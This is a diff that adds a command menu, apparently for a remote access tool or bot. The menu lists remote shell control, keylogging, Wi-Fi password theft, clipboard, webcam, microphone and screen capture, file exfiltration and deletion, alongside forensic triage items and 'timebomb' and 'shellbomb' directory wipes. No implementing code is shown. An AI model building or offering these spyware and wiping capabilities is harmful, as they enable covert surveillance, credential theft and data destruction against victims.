@@ -1,0 +1,32 @@
+start - Get-menu
+cmd - Run CMD <command>
+shell - Interactive shell on/off
+ls - List folders <path>
+screenshot - Screen photo
+screenrec - Record screen (3s)
+webcam - Webcam photo
+sysinfo - CPU, RAM, Battery
+keylog - Keyboard tracker (on/off/get)
+rec - Record microphone <sec>
+wifi - Get Wi-Fi passwords
+search - Search files <name>
+clipboard - Get copied text
+shutdown - Power controls
+restart - Power controls
+getfile - Download files <path>
+delete - Delete file/folder <path>
+images - Media handlers
+videos - Media handlers
+pdf - Media handlers
+forensic - Show forensic menu
+processes - Active processes & signatures
+network - Network connections & Geo-IP
+persistence - Registry, Startup, WMI, Browser
+files - Recent files, Prefetch, USB
+eventlogs - Security, PowerShell logs
+tactical - 10-Step FBI audit
+triage - 25-Step live response
+export - Export all evidence
+shellbomb - Securely wipe directory in 50s
+terminate - Kill processes & wipe folder
+timebomb - Set persistent timebomb wipe
